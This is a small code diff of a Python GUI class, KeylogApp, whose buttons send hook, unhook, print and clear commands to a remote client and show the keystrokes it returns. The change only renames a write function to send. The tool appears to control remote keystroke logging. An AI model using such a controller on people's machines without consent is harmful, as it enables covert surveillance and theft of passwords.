@@ -10,18 +10,18 @@ class KeylogApp(KeylogDesigner):
         super().__init__()
 
     def onButtonHookClick(self):
-        utils.write(gv.client, "keylogHook()")
+        utils.send(gv.client, "keylogHook()")
 
     def onButtonUnhookClick(self):
-        utils.write(gv.client, "keylogUnhook()")
+        utils.send(gv.client, "keylogUnhook()")
 
     def onButtonPrintKeyClick(self):
-        utils.write(gv.client, "keylogPrint()")
+        utils.send(gv.client, "keylogPrint()")
 
         self.txtOutput.setText(utils.readStr(gv.client))
 
     def onButtonClearClick(self):
-        utils.write(gv.client, "keylogClear()")
+        utils.send(gv.client, "keylogClear()")
 
         self.txtOutput.setText("")
 
